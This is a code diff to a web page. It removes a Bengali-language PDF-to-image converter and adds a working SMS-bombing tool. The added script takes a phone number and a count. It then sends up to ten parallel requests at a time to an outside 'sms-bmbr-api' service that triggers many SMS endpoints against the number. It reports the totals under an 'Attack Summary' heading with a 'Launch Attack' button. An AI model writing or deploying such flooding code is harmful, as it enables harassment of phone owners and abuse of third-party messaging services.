-    if(typeof pdfjsLib === 'undefined'){
-      throw new Error('PDF ইঞ্জিন লোড হয়নি — ইন্টারনেট সংযোগ চেক করুন এবং পেজ রিলোড করুন');
-    }
-    const arrayBuffer = await currentFile.arrayBuffer();
-    pdfDoc = await pdfjsLib.getDocument({ data: arrayBuffer }).promise;
-    totalPages = pdfDoc.numPages;
-
-    grid.classList.add('show');
-    resultsHead.classList.add('show');
-    pageCountEl.textContent = '0 / ' + totalPages;
-
-    for(let i = 1; i <= totalPages; i++){
-      const card = document.createElement('div');
-      card.className = 'card';
-      card.id = 'card-' + i;
-      card.innerHTML = `
-        <div class="thumb" id="thumb-${i}"><div class="spinner"></div></div>
-        <div class="card-foot">
-          <span class="pnum">পেজ ${i}</span>
-          <button data-idx="${i}" class="dl-single" disabled aria-label="Download page ${i}">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 15V17.5C4 18.8807 5.11929 20 6.5 20H17.5C18.8807 20 20 18.8807 20 17.5V15" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/><path d="M12 4V15M12 15L8 11M12 15L16 11" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          </button>
-        </div>`;
-      grid.appendChild(card);
-      const dlBtn = card.querySelector('.dl-single');
-      dlBtn.disabled = false;
-      dlBtn.addEventListener('click', () => downloadSingle(i, dlBtn));
+    if (phone.length !== 11) {
+      resultContainer.innerHTML = `
+        <div class="result-box error">
+          <div class="result-title" style="color:#ff5c5c;">
+            <i class="fas fa-circle-xmark"></i> Error
+          </div>
+          <p>Please enter a valid 11‑digit phone number.</p>
+        </div>
+      `;
+      return false;
     }
 
-    for(let i = 1; i <= totalPages; i++){
-      progressStatus.textContent = `প্রিভিউ তৈরি হচ্ছে — পেজ ${i}/${totalPages}`;
-      const page = await pdfDoc.getPage(i);
-      const base = page.getViewport({ scale: 1 });
-      const thumbScale = THUMB_WIDTH / base.width;
-      const viewport = page.getViewport({ scale: thumbScale });
-      const canvas = document.createElement('canvas');
-      canvas.width = viewport.width;
-      canvas.height = viewport.height;
-      canvas.style.width = '100%';
-      canvas.style.height = '100%';
-      canvas.style.objectFit = 'contain';
-      canvas.setAttribute('aria-label', `Page ${i} preview`);
-      const ctx = canvas.getContext('2d', { alpha: false });
-      ctx.imageSmoothingEnabled = false; // skip smoothing — this is a tiny preview, not the export
-      await page.render({ canvasContext: ctx, viewport }).promise;
+    // Disable button and show loader
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = `<span class="loader"></span> Sending...`;
+    resultContainer.innerHTML = '';
 
-      // paint the canvas straight into the DOM — no JPEG encode / blob / object-URL
-      // round trip for a preview this small, that step alone was most of the wait
-      const thumb = document.getElementById('thumb-' + i);
-      if(thumb){ thumb.innerHTML = ''; thumb.appendChild(canvas); }
+    const details = [];
+    let totalEndpoints = 0;
+    let successCount = 0;
 
-      const pct = Math.round((i/totalPages)*100);
-      progressFill.style.width = pct + '%';
-      progressPct.textContent = pct + '%';
-      pageCountEl.textContent = `${i} / ${totalPages}`;
-
-      await nextFrame(); // let the browser paint this page before starting the next
+    // Helper: call the API for one iteration
+    async function callOnce(iteration) {
+      try {
+        const url = `https://sms-bmbr-api.vercel.app/?sms=${encodeURIComponent(phone)}`;
+        const response = await fetch(url);
+        const data = await response.json();
+        if (response.ok && data && data.total !== undefined) {
+          totalEndpoints += data.total;
+          successCount++;
+          details.push(`Call ${iteration}: Triggered ${data.total} endpoints.`);
+        } else {
+          details.push(`Call ${iteration}: Error - ${data?.error || 'Unknown error'}`);
+        }
+      } catch (err) {
+        details.push(`Call ${iteration}: Error - ${err.message || 'Network error'}`);
+      }
     }
 
-    progressStatus.textContent = `প্রিভিউ প্রস্তুত — ডাউনলোড করলে আসল রেজোলিউশনে রেন্ডার হবে`;
-    pageCountEl.textContent = totalPages;
-  }catch(err){
-    progressStatus.textContent = 'ত্রুটি: PDF প্রসেস করা যায়নি — ' + (err.message || err);
-    progressFill.style.background = 'var(--danger)';
-    console.error(err);
-  }finally{
-    convertBtn.disabled = false;
-  }
-}
-
-// STEP 2 — full-resolution render, done on demand at the scale/format
-// currently selected, and cached per page so re-downloading is instant.
-async function renderFullRes(idx){
-  const cached = fullResCache[idx];
-  const { scale, format, quality, mime, ext } = currentSettings();
-  if(cached && cached.scale === scale && cached.format === format && cached.quality === quality){
-    return cached;
-  }
-  const page = await pdfDoc.getPage(idx);
-  const base = page.getViewport({ scale: 1 });
-  const longEdgeAtScale = Math.max(base.width, base.height) * scale;
-  const effectiveScale = longEdgeAtScale > MAX_LONG_EDGE
-    ? scale * (MAX_LONG_EDGE / longEdgeAtScale)
-    : scale;
-  const viewport = page.getViewport({ scale: effectiveScale });
-  const canvas = document.createElement('canvas');
-  canvas.width = viewport.width;
-  canvas.height = viewport.height;
-  const ctx = canvas.getContext('2d', { alpha: format !== 'jpeg' });
-  await page.render({ canvasContext: ctx, viewport }).promise;
-  const blob = await canvasToBlob(canvas, mime, format === 'jpeg' ? quality : undefined);
-  canvas.width = 0; canvas.height = 0;
-
-  if(cached && cached.url) URL.revokeObjectURL(cached.url);
-  const result = { blob, url: URL.createObjectURL(blob), ext, scale, format, quality };
-  fullResCache[idx] = result;
-  return result;
-}
-
-function baseName(){
-  return (currentFile ? currentFile.name.replace(/\.pdf$/i, '') : 'pdf-page');
-}
-
-async function downloadSingle(idx, btnEl){
-  if(!pdfDoc) return;
-  const original = btnEl.innerHTML;
-  btnEl.disabled = true;
-  btnEl.innerHTML = '<div class="spinner" style="width:14px;height:14px;"></div>';
-  try{
-    const item = await renderFullRes(idx);
-    const a = document.createElement('a');
-    a.href = item.url;
-    a.download = `${baseName()}-page-${String(idx).padStart(3,'0')}.${item.ext}`;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-  }catch(err){
-    console.error(err);
-    alert('পেজ ' + idx + ' রেন্ডার করা যায়নি');
-  }finally{
-    btnEl.disabled = false;
-    btnEl.innerHTML = original;
-  }
-}
-
-async function downloadAll(){
-  if(!pdfDoc || totalPages === 0) return;
-  downloadAllBtn.disabled = true;
-  const originalHtml = downloadAllBtn.innerHTML;
-  progressWrap.classList.add('show');
-  progressFill.style.background = 'linear-gradient(90deg, var(--amber-dim), var(--amber))';
-
-  try{
-    const zip = new JSZip();
-    for(let i = 1; i <= totalPages; i++){
-      downloadAllBtn.innerHTML = `রেন্ডার হচ্ছে ${i}/${totalPages}...`;
-      progressStatus.textContent = `ZIP-এর জন্য পেজ ${i}/${totalPages} রেন্ডার হচ্ছে...`;
-      const item = await renderFullRes(i);
-      zip.file(`${baseName()}-page-${String(i).padStart(3,'0')}.${item.ext}`, item.blob);
-      const pct = Math.round((i/totalPages)*100);
-      progressFill.style.width = pct + '%';
-      progressPct.textContent = pct + '%';
-      if(i % 3 === 0) await nextFrame();
+    // Send requests with concurrency limit (max 10 at a time)
+    const concurrency = 10;
+    const queue = [];
+    for (let i = 1; i <= count; i++) {
+      queue.push(i);
     }
 
-    progressStatus.textContent = 'জিপ ফাইল তৈরি হচ্ছে...';
-    downloadAllBtn.innerHTML = 'জিপ তৈরি হচ্ছে...';
-    const content = await zip.generateAsync({ type: 'blob' });
-    const url = URL.createObjectURL(content);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `${baseName()}-images.zip`;
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-    URL.revokeObjectURL(url);
-    progressStatus.textContent = `সম্পন্ন — ${totalPages}টি পেজ জিপ করা হয়েছে`;
-  }catch(err){
-    console.error(err);
-    progressStatus.textContent = 'ত্রুটি: ZIP তৈরি করা যায়নি';
-    progressFill.style.background = 'var(--danger)';
-  }finally{
-    downloadAllBtn.innerHTML = originalHtml;
-    downloadAllBtn.disabled = false;
-  }
-}
+    const workers = Array.from({ length: Math.min(concurrency, count) }, async () => {
+      while (queue.length) {
+        const iter = queue.shift();
+        await callOnce(iter);
+      }
+    });
 
-convertBtn.addEventListener('click', convertPdf);
-downloadAllBtn.addEventListener('click', downloadAll);
+    await Promise.all(workers);
+
+    // Build result display
+    let html = `
+      <div class="result-box success">
+        <div class="result-title">
+          <i class="fas fa-circle-check"></i> Attack Summary
+        </div>
+        <div class="result-stats">
+          <div class="stat-item"><i class="fas fa-phone"></i> <strong>${phone}</strong></div>
+          <div class="stat-item"><i class="fas fa-repeat"></i> Attempts: <strong>${count}</strong></div>
+          <div class="stat-item"><i class="fas fa-check-circle green"></i> API calls successful: <strong class="green">${successCount}</strong> / ${count}</div>
+          <div class="stat-item"><i class="fas fa-bolt"></i> Total endpoints triggered: <strong style="color:#f0b34b;">${totalEndpoints}</strong></div>
+        </div>
+        <div class="detail-list">
+          ${details.map(line => {
+            const isError = line.includes('Error');
+            return `<div class="detail-item">
+              <i class="fas ${isError ? 'fa-times-circle' : 'fa-check-circle'}" style="color:${isError ? '#ff5c5c' : '#4caf50'};"></i>
+              ${line}
+            </div>`;
+          }).join('')}
+        </div>
+      </div>
+    `;
+
+    resultContainer.innerHTML = html;
+
+    // Restore button
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = `<i class="fas fa-rocket"></i> Launch Attack`;
+
+    return false;
+  }
 </script>
-
 </body>
 </html>
